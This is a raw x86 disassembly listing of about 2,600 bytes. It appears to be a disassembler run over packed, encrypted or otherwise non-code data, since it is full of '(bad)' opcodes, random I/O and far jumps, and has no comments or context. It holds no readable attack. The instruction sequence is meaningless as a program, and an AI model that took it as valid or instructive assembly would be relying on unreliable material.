  420423:	xor    BYTE PTR [ecx-0x30977294],ah
  420429:	out    0xb5,al
  42042b:	cmp    BYTE PTR ds:0x730bf4ec,cl
  420431:	imul   ebp,DWORD PTR [ebp-0x75],0x20a61f56
  420438:	ss enter 0x90a0,0xd9
  42043d:	arpl   WORD PTR [edx+ebx*1],bp
  420440:	out    dx,eax
  420441:	or     BYTE PTR [edx],0xb1
  420444:	js     0x420469
  420446:	dec    ebp
  420447:	xor    BYTE PTR [edx+0x63b0c657],al
  42044d:	retf   
  42044e:	xor    dh,BYTE PTR [eax]
  420450:	(bad)  
  420451:	xchg   ebx,eax
  420452:	mov    DWORD PTR [edx],ebx
  420454:	jg     0x4204b5
  420456:	loop   0x42046d
  420458:	xchg   DWORD PTR [edx+0x4cb64958],edi
  42045e:	or     DWORD PTR [esi-0x4c],ebx
  420461:	and    esp,DWORD PTR [ecx-0x7080c395]
  420467:	iret   
  420468:	and    BYTE PTR [esi+0x1e],cl
  42046b:	mov    eax,ds:0xc9af1315
  420470:	and    eax,0x795356e8
  420475:	and    dh,BYTE PTR [ebp+0x3f]
  420478:	dec    ebx
  420479:	mov    esi,0x27117116
  42047e:	adc    al,0x3
  420480:	(bad)  
  420481:	fcomp  DWORD PTR es:[ebp+0xd0f3194]
  420488:	sub    al,bh
  42048a:	into   
  42048b:	or     DWORD PTR [eax+0x7],esi
  42048e:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  42048f:	sbb    BYTE PTR [eax],al
	...
  4204f1:	add    BYTE PTR [eax],al
  4204f3:	add    BYTE PTR [esi+0x7f125794],ch
  4204f9:	shr    edi,cl
  4204fb:	mov    esp,0x5a7f6c39
  420500:	jmp    0x420495
  420502:	popa   
  420503:	mov    ch,0xec
  420505:	push   edi
  420506:	add    DWORD PTR [eax],eax
  420508:	add    al,0x1
  42050a:	add    BYTE PTR [eax],al
  42050c:	ficom  DWORD PTR [eax+0x37]
  42050f:	stos   DWORD PTR es:[edi],eax
  420510:	mov    ss,WORD PTR [edi-0x48]
  420513:	sbb    dl,BYTE PTR [edi+0xc]
  420516:	mov    edi,DWORD PTR ds:0xb60956b9
  42051c:	into   
  42051d:	push   edx
  42051e:	stos   BYTE PTR es:[edi],al
  42051f:	mov    dh,dh
  420521:	rcr    DWORD PTR [ecx+ebx*1],cl
  420524:	loop   0x420548
  420526:	mov    WORD PTR [eax],gs
  420528:	nop
  420529:	sti    
  42052a:	aaa    
  42052b:	xchg   ebx,eax
  42052c:	(bad)  
  42052d:	push   0x18
  42052f:	jge    0x42056d
  420531:	popa   
  420532:	and    al,0xad
  420534:	adc    eax,0x7cebcdb8
  420539:	aas    
  42053a:	out    dx,eax
  42053b:	in     eax,0xa8
  42053d:	and    al,BYTE PTR [ebp+0x13d67956]
  420543:	xor    bl,bl
  420545:	pop    eax
  420546:	ss aas 
  420548:	and    DWORD PTR [edi-0x5355d94e],esp
  42054e:	jg     0x4205a2
  420550:	mov    edx,0x80ebb38c
  420555:	jl     0x420504
  420557:	repnz sahf 
  420559:	fs mov dh,0xae
  42055c:	add    al,0xf0
  42055e:	call   DWORD PTR [edi]
  420560:	std    
  420561:	mov    edi,eax
  420563:	adc    edx,ebx
  420565:	cli    
  420566:	ins    DWORD PTR es:[edi],dx
  420567:	ret    0x62a7
  42056a:	mov    eax,0xa675025f
  42056f:	add    eax,DWORD PTR [edx+ecx*2-0x40d692cb]
  420576:	mov    WORD PTR ds:0x3aedc23b,gs
  42057c:	fcomi  st,st(4)
  42057e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  42057f:	mov    al,BYTE PTR [ebx-0x17]
  420582:	push   es
  420583:	jb     0x42054e
  420585:	dec    edi
  420586:	xchg   ebp,eax
  420587:	sub    BYTE PTR [ebx],al
  420589:	xchg   edx,eax
  42058a:	push   edx
  42058b:	xor    BYTE PTR [ecx+esi*1+0x5],dh
  42058f:	mov    es,WORD PTR [edi-0x11]
  420592:	jp     0x4205c5
  420594:	add    al,0x67
  420596:	xor    al,0xe3
  420598:	pop    esi
  420599:	cmp    BYTE PTR [ebp+0x39],ah
  42059c:	je     0x4205d5
  42059e:	mov    cl,0xf9
  4205a0:	lods   eax,DWORD PTR ds:[esi]
  4205a1:	adc    al,0xc6
  4205a3:	mov    dh,0x52
  4205a5:	xor    DWORD PTR [edi],0x16cb309c
  4205ab:	add    BYTE PTR [edi-0x46],al
  4205ae:	popf   
  4205af:	mov    DWORD PTR ds:0x6a0c320e,esi
  4205b5:	cmc    
  4205b6:	push   esi
  4205b7:	push   esi
  4205b8:	xor    dl,0xc8
  4205bb:	push   es
  4205bc:	ins    DWORD PTR es:[edi],dx
  4205bd:	(bad)  
  4205be:	mov    edi,0x91ac0b34
  4205c3:	adc    eax,0x524f3815
  4205c8:	push   0xffffff82
  4205ca:	mov    ecx,0x1c435a6b
  4205cf:	mov    esi,0xc10a6f64
  4205d4:	xchg   DWORD PTR [ebp+0x5583d462],ecx
  4205da:	in     eax,0xf2
  4205dc:	jmp    0x392:0x43799fa5
  4205e3:	ja     0x420612
  4205e5:	popf   
  4205e6:	inc    esi
  4205e7:	sub    eax,esi
  4205e9:	jno    0x4205b4
  4205eb:	repz and al,0x5e
  4205ee:	sub    ecx,DWORD PTR [esi+esi*8]
  4205f1:	lods   al,BYTE PTR ds:[esi]
  4205f2:	es repnz sahf 
  4205f5:	push   cs
  4205f6:	dec    esp
  4205f7:	test   eax,0x25f27051
  4205fc:	std    
  4205fd:	sub    DWORD PTR [edi-0x7c],esi
  420600:	aaa    
  420601:	fadd   QWORD PTR [ebp+0x2f44604a]
  420607:	mov    edx,0x9360d281
  42060c:	xchg   esi,eax
  42060d:	jno    0x4205b7
  42060f:	add    al,0x0
	...
  420671:	add    BYTE PTR [eax],al
  420673:	add    BYTE PTR [eax+ebp*2-0x2703f748],al
  42067a:	mov    ah,0xec
  42067c:	lds    eax,FWORD PTR [eax]
  42067e:	aad    0x78
  420680:	xchg   BYTE PTR [ebp+0x58f0dc01],bh
  420686:	add    DWORD PTR [eax],eax
  420688:	add    al,0x1
  42068a:	add    BYTE PTR [eax],al
  42068c:	nop
  42068d:	in     eax,dx
  42068e:	out    dx,al
  42068f:	inc    esi
  420690:	in     al,0x80
  420692:	addr16 xchg ebp,eax
  420694:	mov    ebp,0x41fa53a5
  420699:	scas   eax,DWORD PTR es:[edi]
  42069a:	call   DWORD PTR [ebx+0x17fb1b47]
  4206a0:	and    al,BYTE PTR [esi]
  4206a2:	and    dl,BYTE PTR ss:[edx]
  4206a5:	xor    eax,0xec1fc37b
  4206aa:	push   ebx
  4206ab:	mov    bl,0x3f
  4206ad:	rcr    BYTE PTR [eax],1
  4206af:	adc    eax,eax
  4206b1:	lea    eax,ss:[edi-0x36]
  4206b5:	xchg   DWORD PTR [eax-0x7676c06],edi
  4206bb:	and    al,0xfd
  4206bd:	lahf   
  4206be:	inc    edx
  4206bf:	test   eax,0x1ac23cb4
  4206c4:	and    DWORD PTR [eax],0xfffffff7
  4206c7:	sbb    DWORD PTR [ebp-0x8],esi
  4206ca:	int    0x40
  4206cc:	jnp    0x4206a1
  4206ce:	out    0x1a,al
  4206d0:	dec    esi
  4206d1:	fnstenv [eax+0x7c128444]
  4206d7:	mov    eax,ds:0x8d9d137c
  4206dc:	push   ebx
  4206dd:	push   ebx
  4206de:	stos   BYTE PTR es:[edi],al
  4206df:	repz xchg ebx,eax
  4206e1:	pusha  
  4206e2:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4206e3:	mov    ebx,0x40c248c5
  4206e8:	and    BYTE PTR [ecx],cl
  4206ea:	retf   0x339b
  4206ed:	daa    
  4206ee:	cdq    
  4206ef:	adc    DWORD PTR [ecx+0x1a],esi
  4206f2:	mov    ah,0x21
  4206f4:	out    dx,eax
  4206f5:	sbb    eax,0xd7f63995
  4206fa:	fwait
  4206fb:	out    dx,eax
  4206fc:	aam    0x70
  4206fe:	xchg   edx,eax
  4206ff:	inc    esp
  420700:	cs pop ebp
  420702:	pop    edx
  420703:	test   BYTE PTR fs:[esi-0x2cb584e6],0x70
  42070b:	inc    DWORD PTR [eax]
  42070d:	pop    ebx
  42070e:	xchg   ebp,eax
  42070f:	popf   
  420710:	xor    edx,DWORD PTR [edx+0x2b9bfa22]
  420716:	pop    ecx
  420717:	mov    ebp,0xa74b71d2
  42071c:	mov    ds:0x8e44d5ef,eax
  420721:	and    eax,0xde1b3fe1
  420726:	adc    eax,0x4b98986
  42072b:	shl    BYTE PTR [edi+0x20],cl
  42072e:	(bad)  
  42072f:	mov    dh,0x3c
  420731:	loopne 0x4206b7
  420733:	sbb    DWORD PTR [edx],ebx
  420735:	xlat   BYTE PTR ds:[ebx]
  420736:	lds    esi,FWORD PTR [edx]
  420738:	popa   
  420739:	jecxz  0x4206ca
  42073b:	ins    DWORD PTR es:[edi],dx
  42073c:	cmp    ebx,DWORD PTR [esi-0x74eb7fd1]
  420742:	lds    edx,FWORD PTR [ebp+0x4cd8c2c]
  420748:	or     eax,0x38cbe6ca
  42074d:	mov    dh,ah
  42074f:	retf   0x9a8c
  420752:	outs   dx,DWORD PTR ds:[esi]
  420753:	and    cl,BYTE PTR [ebp-0x66]
  420756:	(bad)  
  420757:	loop   0x42079d
  420759:	mov    ecx,DWORD PTR [ebp+ebp*8+0x3d5b0844]
  420760:	or     edx,ebx
  420762:	nop
  420763:	mov    ch,0x33
  420765:	sub    cl,BYTE PTR [eax-0x7d]
  420768:	fiadd  DWORD PTR [ebx-0x26]
  42076b:	cwde   
  42076c:	mov    esp,0xfe551fc2
  420771:	add    BYTE PTR [edi+0x1f9a4a30],0x3f
  420778:	dec    eax
  420779:	es jecxz 0x4207eb
  42077c:	shl    BYTE PTR [ebp+0x51e0a7f2],0x6a
  420783:	push   esi
  420784:	mov    esi,0xf5783868
  420789:	or     BYTE PTR [edi+eax*4+0x65a0eab6],ch
	...
  4207f4:	mov    DWORD PTR [edi],ebp
  4207f6:	and    eax,0xad8aa780
  4207fb:	das    
  4207fc:	cmp    DWORD PTR [edi-0x24],ebp
  4207ff:	pusha  
  420800:	cmp    cl,bh
  420802:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420803:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420804:	hlt    
  420805:	pop    ecx
  420806:	add    DWORD PTR [eax],eax
  420808:	add    al,0x1
  42080a:	add    BYTE PTR [eax],al
  42080c:	hlt    
  42080d:	nop
  42080e:	test   BYTE PTR [edx],bh
  420810:	fucomip st,st(5)
  420812:	and    dh,BYTE PTR [eax+esi*2+0x43]
  420816:	mov    cl,0x34
  420818:	add    ebx,DWORD PTR [ebx]
  42081a:	imul   BYTE PTR [edx-0x74]
  42081d:	std    
  42081e:	lahf   
  42081f:	stc    
  420820:	adc    eax,0xe84c8429
  420825:	scas   eax,DWORD PTR es:[edi]
  420826:	mov    dh,0x1b
  420828:	add    DWORD PTR [esi+0x556a88e3],esi
  42082e:	and    edx,ebx
  420830:	jae    0x4207fd
  420832:	shl    DWORD PTR [eax-0x5d24d17a],0xd0
  420839:	mov    al,0xd8
  42083b:	xor    DWORD PTR [edx-0x6f5d7511],ebx
  420841:	jno    0x4208ac
  420843:	dec    ecx
  420844:	xchg   DWORD PTR [eax+0x37],edi
  420847:	shl    DWORD PTR [eax+esi*8+0x41],1
  42084b:	push   ebx
  42084c:	shl    DWORD PTR [eax+0x24],0x57
  420850:	push   eax
  420851:	(bad)  
  420852:	cdq    
  420853:	and    ch,cl
  420855:	(bad)  
  420856:	adc    ah,BYTE PTR [ebx-0x461d31a9]
  42085c:	push   edi
  42085d:	loope  0x420849
  42085f:	xchg   ecx,eax
  420860:	stos   BYTE PTR es:[edi],al
  420861:	repnz sub eax,0xc21e5e23
  420867:	ret    
  420868:	je     0x420896
  42086a:	outs   dx,BYTE PTR ds:[esi]
  42086c:	jns    0x420865
  42086e:	sbb    bl,dh
  420870:	popa   
  420871:	loopne 0x420806
  420873:	ficomp WORD PTR [edi]
  420875:	sbb    BYTE PTR [eax+0xbbe1be4],ah
  42087b:	sub    al,0x17
  42087d:	sahf   
  42087e:	pop    ebx
  42087f:	and    BYTE PTR [eax-0x34],dh
  420882:	mov    esi,0x248c8d99
  420887:	std    
  420888:	ds fs pop edx
  42088b:	push   ecx
  42088c:	push   cs
  42088d:	(bad)  
  42088e:	retf   
  42088f:	cdq    
  420890:	mov    ebp,0x930c4ed8
  420895:	mov    al,0x93
  420897:	push   edx
  420898:	les    eax,FWORD PTR [edi-0x7e]
  42089b:	push   ebx
  42089c:	jl     0x4208c6
  42089e:	pop    esi
  42089f:	pop    esp
  4208a0:	dec    ebx
  4208a1:	aaa    
  4208a2:	out    dx,eax
  4208a3:	push   esp
  4208a4:	loop   0x4208a0
  4208a6:	mov    ah,0x2f
  4208a8:	nop
  4208a9:	mov    al,0xe5
  4208ab:	pusha  
  4208ac:	jns    0x420894
  4208ae:	jns    0x4208e6
  4208b0:	jo     0x420900
  4208b2:	shl    BYTE PTR [edx+ebp*4+0x7f],cl
  4208b6:	ret    0xcaa9
  4208b9:	rcl    DWORD PTR [eax+ebx*8+0x7c],0xa7
  4208be:	xor    DWORD PTR [ecx+eax*2+0x6c],edi
  4208c2:	pop    edx
  4208c3:	xchg   DWORD PTR [edx-0x1c],edi
  4208c6:	fwait
  4208c7:	pop    es
  4208c8:	int3   
  4208c9:	pusha  
  4208ca:	mul    DWORD PTR [eax+0x59c635f2]
  4208d0:	into   
  4208d1:	sbb    eax,0x7cce982f
  4208d6:	jl     0x4208be
  4208d8:	cdq    
  4208d9:	inc    esi
  4208da:	xchg   ebp,eax
  4208db:	(bad)  
  4208dc:	jnp    0x420938
  4208de:	leave  
  4208df:	inc    eax
  4208e0:	out    0x18,al
  4208e2:	jp     0x4208aa
  4208e4:	or     DWORD PTR [eax-0x150f91af],0xe1583c5e
  4208ee:	jge    0x420915
  4208f0:	jae    0x420968
  4208f2:	pop    ebp
  4208f3:	int    0x81
  4208f5:	adc    DWORD PTR [eax+0x5c],ecx
  4208f8:	retf   
  4208f9:	rcl    DWORD PTR [ebx+0x6fdbdf30],cl
  4208ff:	fsubr  st,st(1)
  420901:	jne    0x420973
  420903:	pop    esi
  420904:	loopne 0x420969
  420906:	and    ecx,ecx
  420908:	jo     0x42092e
  42090a:	push   eax
  42090b:	inc    esp
  42090c:	(bad)  
  42090d:	aas    
  42090e:	in     al,dx
  42090f:	pop    DWORD PTR [eax]
	...
  420971:	add    BYTE PTR [eax],al
  420973:	add    ah,bl
  420975:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  420976:	jae    0x4209c5
  420978:	jnp    0x420959
  42097a:	(bad)  
  42097b:	mov    ch,0xd2
  42097d:	ja     0x4209dd
  42097f:	mov    dh,0x34
  420981:	sub    al,0xbf
  420983:	pop    ebp
  420984:	clc    
  420985:	pop    edx
  420986:	add    DWORD PTR [eax],eax
  420988:	add    al,0x1
  42098a:	add    BYTE PTR [eax],al
  42098c:	in     eax,0xb6
  42098e:	inc    ebx
  42098f:	adc    al,BYTE PTR [edx]
  420991:	inc    ebx
  420992:	jb     0x420970
  420994:	dec    edi
  420995:	nop
  420996:	leave  
  420997:	xor    eax,0x8b060966
  42099c:	out    dx,eax
  42099d:	sub    esp,ecx
  42099f:	loope  0x4209aa
  4209a1:	pop    esp
  4209a2:	icebp  
  4209a3:	fwait
  4209a4:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4209a5:	xchg   esi,eax
  4209a6:	cwde   
  4209a7:	and    DWORD PTR [eax+0x4ff6fe0a],0x413c55a3
  4209b1:	cmp    eax,ebp
  4209b3:	jg     0x420993
  4209b5:	(bad)  
  4209b6:	cwde   
  4209b7:	dec    edx
  4209b8:	(bad)  
  4209b9:	cwde   
  4209ba:	push   eax
  4209bb:	xor    DWORD PTR [esi],0x94fae5f0
  4209c1:	inc    esi
  4209c2:	iret   
  4209c3:	add    al,al
  4209c5:	std    
  4209c6:	inc    ecx
  4209c7:	jp     0x4209c1
  4209c9:	out    0x3f,eax
  4209cb:	jg     0x420951
  4209cd:	inc    edx
  4209ce:	(bad)  
  4209cf:	adc    edx,DWORD PTR [eax-0xacb4041]
  4209d5:	jnp    0x420a29
  4209d7:	xor    eax,0x5b4028aa
  4209dc:	retf   
  4209dd:	adc    al,0x5f
  4209df:	out    dx,al
  4209e0:	and    al,0xf9
  4209e2:	lods   al,BYTE PTR ds:[esi]
  4209e3:	lock and ecx,eax
  4209e6:	rcl    BYTE PTR [edx],1
  4209e8:	inc    edx
  4209e9:	shl    edi,0x20
  4209ec:	je     0x4209e0
  4209ee:	sub    eax,0x1ba543d5
  4209f3:	popf   
  4209f4:	or     DWORD PTR [eax+edi*4-0x22481285],ebx
  4209fb:	adc    DWORD PTR [eax-0x7d],eax
  4209fe:	or     al,0xfd
  420a00:	lods   al,BYTE PTR ds:[esi]
  420a01:	add    DWORD PTR [ebx],ecx
  420a03:	bound  ebx,QWORD PTR [edx+esi*2-0xc]
  420a07:	retf   0x3d32
  420a0a:	je     0x420a20
  420a0c:	xor    ebx,DWORD PTR [edi+0x22]
  420a0f:	sub    ebx,DWORD PTR [esp+edx*4]
  420a12:	sub    bh,bh
  420a14:	xchg   ebp,eax
  420a15:	xor    BYTE PTR [eax+0x1ba7125d],0x6f
  420a1c:	sbb    eax,0xcc99ddd4
  420a21:	add    al,0x6b
  420a23:	dec    edx
  420a24:	sbb    esi,DWORD PTR [esi-0x28]
  420a27:	outs   dx,BYTE PTR ds:[esi]
  420a28:	dec    edi
  420a29:	mov    edx,0x35f79d2d
  420a2e:	pusha  
  420a2f:	in     eax,0x46
  420a31:	mov    edx,0x389ddc2e
  420a36:	enter  0x1326,0xe3
  420a3a:	imul   ebp,DWORD PTR [ebx],0xffffffa4
  420a3d:	inc    ecx
  420a3e:	mov    ah,0x69
  420a40:	mov    dh,0x56
  420a42:	adc    esp,DWORD PTR [ecx-0x7edd58]
  420a48:	aas    
  420a49:	mov    esi,esi
  420a4b:	cmp    eax,0xd8ebdcfd
  420a50:	adc    eax,0x98e1468e
  420a56:	sbb    BYTE PTR [eax],0x60
  420a59:	jge    0x4209f0
  420a5b:	xor    edi,DWORD PTR [eax-0x32]
  420a5e:	arpl   WORD PTR [edi+esi*1],ax
  420a61:	fwait
  420a62:	xchg   DWORD PTR [esi],edi
  420a64:	dec    ecx
  420a65:	adc    ebp,esi
  420a67:	mov    cl,0x3e
  420a69:	push   esi
  420a6a:	clc    
  420a6b:	jbe    0x420a0e
  420a6d:	sub    al,0xd4
  420a6f:	fiadd  DWORD PTR [eax+0x67]
  420a72:	mov    al,ds:0x6d9c503e
  420a77:	outs   dx,BYTE PTR ds:[esi]
  420a78:	(bad)  
  420a79:	cld    
  420a7a:	imul   DWORD PTR [eax+0x8374f5b]
  420a80:	add    DWORD PTR [edx+0x3bb2235d],edx
  420a86:	jecxz  0x420ae4
  420a88:	mov    al,ds:0x6c51117b
  420a8d:	outs   dx,DWORD PTR ds:[esi]
  420a8e:	xchg   DWORD PTR [edx+0x0],esp
	...
  420af1:	add    BYTE PTR [eax],al
  420af3:	add    bh,bl
  420af5:	xor    ch,BYTE PTR [edi-0x6010ed]
  420afb:	(bad)  
  420afc:	xlat   BYTE PTR ds:[ebx]
  420afd:	out    dx,eax
  420afe:	(bad)  
  420aff:	cld    
  420b00:	and    BYTE PTR [esi+0x5bfc2b99],0x1
  420b07:	add    BYTE PTR [ecx+eax*1],al
  420b0a:	add    BYTE PTR [eax],al
  420b0c:	sub    edx,ecx
  420b0e:	xchg   esp,eax
  420b0f:	aam    0xc2
  420b11:	mov    ds:0x2ee71600,al
  420b16:	gs repz push ebp
  420b19:	ret    
  420b1a:	mov    dl,0xc2
  420b1c:	jbe    0x420b04
  420b1e:	xor    ch,BYTE PTR [esi-0x1f]
  420b21:	sub    eax,0xe5b0bfed
  420b26:	xor    eax,0x84b000ea
  420b2b:	xor    al,0xcf
  420b2d:	xor    BYTE PTR [ebx],bh
  420b2f:	dec    esp
  420b30:	mov    dl,0xfd
  420b32:	and    ebx,DWORD PTR [ebp+0x18742b8d]
  420b38:	cld    
  420b39:	sub    al,0xac
  420b3b:	sbb    edx,DWORD PTR [ebx-0x5]
  420b3e:	jne    0x420b16
  420b40:	pop    ebx
  420b41:	sbb    dh,ch
  420b43:	adc    ebp,DWORD PTR [edx]
  420b45:	test   DWORD PTR ds:[ebx+0xfeb6ffc],edi
  420b4c:	pop    ebx
  420b4d:	sub    cl,BYTE PTR [ebx]
  420b4f:	cmp    eax,0xb0868dc2
  420b54:	xchg   edx,esp
  420b56:	sub    DWORD PTR [esi+ecx*4-0x73333fc0],0xacfa5ab6
  420b61:	xchg   DWORD PTR [eax-0x3bb230e5],esp
  420b67:	out    0x47,eax
  420b69:	lds    edi,FWORD PTR [ebp-0x5a]
  420b6c:	dec    DWORD PTR [esi+eax*2-0x5397946e]
  420b73:	jne    0x420bcc
  420b75:	and    eax,0x5781064f
  420b7a:	xlat   BYTE PTR ds:[ebx]
  420b7b:	add    al,0x6b
  420b7d:	fld    TBYTE PTR [edi]
  420b7f:	and    al,0x1f
  420b81:	mov    esi,0xb39f1174
  420b86:	xchg   edx,eax
  420b87:	fnstcw WORD PTR [ebx+eax*1]
  420b8a:	or     DWORD PTR [ebx-0x1],esp
  420b8d:	js     0x420b6f
  420b8f:	xor    al,0xef
  420b91:	xchg   edi,eax
  420b92:	jp     0x420c0b
  420b94:	add    eax,0xe50ab81d
  420b99:	ret    0xe73b
  420b9c:	adc    edi,DWORD PTR [ebx+0x685ddfe2]
  420ba2:	daa    
  420ba3:	stos   DWORD PTR es:[edi],eax
  420ba4:	scas   al,BYTE PTR es:[edi]
  420ba5:	add    eax,0xb952908e
  420baa:	imul   eax,esi,0xb5aa4597
  420bb0:	sub    eax,0x98a12cca
  420bb5:	push   ds
  420bb6:	div    BYTE PTR [ebp-0x100cb9e]
  420bbc:	ins    DWORD PTR es:[edi],dx
  420bbd:	sub    cl,BYTE PTR [ecx+0x7e6fea57]
  420bc3:	jge    0x420bae
  420bc5:	or     bl,BYTE PTR [edx+ebx*1]
  420bc8:	pop    esi
  420bc9:	sub    dh,BYTE PTR [esi-0x4]
  420bcc:	lods   al,BYTE PTR ds:[esi]
  420bcd:	pop    edi
  420bce:	dec    ecx
  420bcf:	jl     0x420b61
  420bd1:	fisub  DWORD PTR [ebx+0x40]
  420bd4:	sub    BYTE PTR [esi-0x260ab9e2],ah
  420bda:	pop    esi
  420bdb:	jb     0x420c25
  420bdd:	mov    ecx,0x57d0de91
  420be2:	jp     0x420c1b
  420be4:	loop   0x420b90
  420be6:	xlat   BYTE PTR ds:[ebx]
  420be7:	retf   0x2e0a
  420bea:	push   0x57
  420bec:	(bad)  
  420bee:	adc    eax,0x28cc626b
  420bf3:	scas   al,BYTE PTR es:[edi]
  420bf4:	lea    esp,[esi+0x7a]
  420bf7:	sar    BYTE PTR [ecx-0x3e],1
  420bfa:	movups XMMWORD PTR [edx+edx*4],xmm1
  420bfe:	ja     0x420ba8
  420c00:	cmp    eax,0x28376cba
  420c05:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  420c06:	push   cs
  420c07:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  420c08:	xor    DWORD PTR [ecx],0x7
  420c0b:	ficomp DWORD PTR [ecx+0x61]
  420c0e:	pop    ebx
  420c0f:	imul   eax,DWORD PTR [eax],0x0
	...
  420c72:	add    BYTE PTR [eax],al
  420c74:	mov    dl,BYTE PTR ds:0xbf9fb10b
  420c7a:	mov    edx,0x1886e3f
  420c7f:	in     eax,0x21
  420c81:	dec    edi
  420c82:	mov    eax,ds:0x15d0059
  420c87:	add    BYTE PTR [ecx+eax*1],al
  420c8a:	add    BYTE PTR [eax],al
  420c8c:	(bad)  
  420c8e:	cmp    ebx,ecx
  420c90:	lods   eax,DWORD PTR cs:[esi]
  420c92:	ret    0x469e
  420c95:	lods   eax,DWORD PTR ds:[esi]
  420c96:	adc    DWORD PTR ds:0x520ecb00,edi
  420c9c:	dec    edi
  420c9d:	clc    
  420c9e:	mov    eax,0xdda58a49
  420ca3:	mov    es,WORD PTR [ecx+ecx*2+0x77]
  420ca7:	xchg   esi,eax
  420ca8:	je     0x420c8e
  420caa:	repz dec edi
  420cac:	jno    0x420cc3
  420cae:	dec    esp
  420caf:	in     eax,0x57
  420cb1:	or     eax,0x868a4c7
  420cb6:	fist   DWORD PTR [ecx-0x7e]
  420cb9:	lock xchg ecx,eax
  420cbb:	pop    ss
  420cbc:	ror    BYTE PTR [ebx-0x7d45667e],0x6a
  420cc3:	cli    
  420cc4:	sub    dl,BYTE PTR [ebp+0x1628c34c]
  420cca:	in     al,dx
  420ccb:	adc    edi,DWORD PTR [ecx-0x317ca45f]
  420cd1:	sub    bh,BYTE PTR ds:0xd40575bc
  420cd7:	or     eax,0xdfbb6e41
  420cdc:	adc    al,0xf6
  420cde:	out    0x9b,al
  420ce0:	inc    esi
  420ce1:	arpl   bp,bp
  420ce3:	(bad)  
  420ce4:	pushf  
  420ce5:	mov    eax,ds:0x98a14de
  420cea:	fsubrp st(3),st
  420cec:	pop    edx
  420ced:	jns    0x420d49
  420cef:	jno    0x420cd4
  420cf1:	ret    0xaa2a
  420cf4:	jecxz  0x420d29
  420cf6:	or     bl,bl
  420cf8:	mov    al,0xf2
  420cfa:	mov    ch,0x81
  420cfc:	ss je  0x420d06
  420cff:	cwde   
  420d00:	or     DWORD PTR [ebp+ebp*8+0xe],0x2d
  420d05:	out    dx,eax
  420d06:	int    0xa2
  420d08:	test   esi,esp
  420d0a:	pop    ebp
  420d0b:	fstp   TBYTE PTR [ebp+ebx*8-0x5f]
  420d0f:	daa    
  420d10:	or     dh,BYTE PTR [ebp+0x49]
  420d13:	popf   
  420d14:	xchg   edx,eax
  420d15:	aas    
  420d16:	mov    cl,0x37
  420d18:	inc    esi
  420d19:	sub    BYTE PTR [edx],al
  420d1b:	cli    
  420d1c:	and    al,0xfb
  420d1e:	cmp    al,0x95
  420d20:	xchg   esi,eax
  420d21:	push   esp
  420d22:	icebp  
  420d23:	adc    DWORD PTR [ecx+0x67],ecx
  420d26:	aad    0x9d
  420d28:	loopne 0x420cf2
  420d2a:	dec    ebx
  420d2b:	loop   0x420da2
  420d2d:	scas   eax,DWORD PTR es:[edi]
  420d2e:	jbe    0x420d38
  420d30:	aam    0xc9
  420d32:	jmp    0x162c:0x305a4739
  420d39:	outs   dx,DWORD PTR ds:[esi]
  420d3a:	fld    DWORD PTR [ebx]
  420d3c:	es pop ebx
  420d3e:	std    
  420d3f:	mov    ecx,DWORD PTR [ebp-0x3f]
  420d42:	scas   al,BYTE PTR es:[edi]
  420d43:	jns    0x420da6
  420d45:	jg     0x420cf2
  420d47:	pop    edi
  420d48:	xchg   esi,eax
  420d49:	rcr    DWORD PTR [ebx+0xe],0x5e
  420d4d:	xchg   ebp,eax
  420d4e:	or     BYTE PTR [esi+0x2c],al
  420d51:	sbb    eax,0xd36aa58c
  420d56:	sub    eax,0x5e47a735
  420d5b:	sub    eax,0x55b0b401
  420d60:	shl    DWORD PTR [edx-0x60],0xfa
  420d64:	test   al,cl
  420d66:	add    BYTE PTR [ebp-0x11af443],0x63
  420d6d:	push   0x58
  420d6f:	sbb    al,0xb7
  420d71:	les    ebx,FWORD PTR [edi+0x50]
  420d74:	jmp    0x4b573c7
  420d79:	ror    DWORD PTR [eax+0xa1b8a1d],cl
  420d7f:	test   eax,0xa4a47ab0
  420d84:	xchg   edi,eax
  420d85:	lahf   
  420d86:	sub    esi,DWORD PTR [edi+edi*2-0x34f2a8e3]
  420d8d:	test   BYTE PTR [ebx],dl
  420d8f:	rol    DWORD PTR [eax],1
	...
  420df1:	add    BYTE PTR [eax],al
  420df3:	add    bh,ah
  420df5:	push   ds
  420df6:	into   
  420df7:	push   0x9fe7f8ff
  420dfc:	push   esi
  420dfd:	inc    edi
  420dfe:	lahf   
  420dff:	mov    al,ds:0x2b62f145
  420e04:	add    al,0x5e
  420e06:	add    DWORD PTR [eax],eax
  420e08:	add    al,0x1
  420e0a:	add    BYTE PTR [eax],al
  420e0c:	in     eax,dx
  420e0d:	xchg   esp,eax
  420e0e:	pop    ebp
  420e0f:	ins    BYTE PTR es:[edi],dx
  420e10:	jb     0x420e74
  420e12:	lds    edi,FWORD PTR [esi+0x6c]
  420e15:	repnz leave 
  420e17:	mov    edi,0xb4e4504
  420e1c:	inc    esp
  420e1d:	push   ss
  420e1e:	dec    ecx
  420e1f:	jo     0x420daf
  420e21:	ret    
  420e22:	daa    
  420e23:	aas    
  420e24:	xor    cl,ch
  420e26:	inc    esp
  420e27:	dec    edi
  420e28:	fdiv   QWORD PTR [esi]
  420e2a:	test   DWORD PTR [ecx+0x4db41b7e],0x52e28141
  420e34:	ret    
  420e35:	xchg   esi,eax
  420e36:	sbb    al,0x4e
  420e38:	cmp    eax,DWORD PTR [ebx-0x612c895c]
  420e3e:	je     0x420e1a
  420e40:	pop    edx
  420e41:	dec    esi
  420e42:	in     eax,dx
  420e43:	stos   DWORD PTR es:[edi],eax
  420e44:	(bad)  
  420e45:	pop    edi
  420e46:	cs out 0xc9,al
  420e49:	jnp    0x420e71
  420e4b:	adc    BYTE PTR [edx+0x576dc599],dl
  420e51:	rcr    DWORD PTR [esi+0x16c45ed8],1
  420e57:	inc    ebx
  420e58:	push   eax
  420e59:	jno    0x420e74
  420e5b:	inc    eax
  420e5c:	push   eax
  420e5d:	repnz ins BYTE PTR es:[edi],dx
  420e5f:	jle    0x420eb6
  420e61:	push   ebx
  420e62:	leave  
  420e63:	add    BYTE PTR ds:0x9cb42da7,0x84
